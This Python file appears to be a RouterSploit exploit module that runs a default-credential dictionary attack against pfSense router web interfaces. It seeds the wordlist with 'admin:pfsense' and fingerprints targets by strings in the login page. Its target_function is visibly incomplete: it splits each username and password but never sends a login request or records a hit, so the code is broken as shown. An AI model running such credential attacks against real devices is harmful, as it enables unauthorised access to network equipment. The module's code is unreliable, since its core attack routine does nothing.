from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "PFSense Router Default Web Interface Creds - HTTP Form",
        "description": "Module performs dictionary attack against PFSense Router web interface. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "PFSense Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(443, "Target Web Interface port")
    ssl = OptBool(True, "SSL enabled: true/false")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:pfsense", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(False, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Displaye authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default creds attack")

        self.run_threads(self.threads, self.target_function, self.defaults)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, data):
        username, password = data.split(":", 1)

    def check(self):
        response = self.http_request(
            method="GET",
            path="/",
        )
        if response is None:
            return False

        if all([x in response.text for x in ['<script type="text/javascript" src="/themes/pfsense_ng/javascript/niftyjsCode.js"></script>', 'var csrfMagicToken =']]):
            return True

        return False

    def check_default(self):
        return None
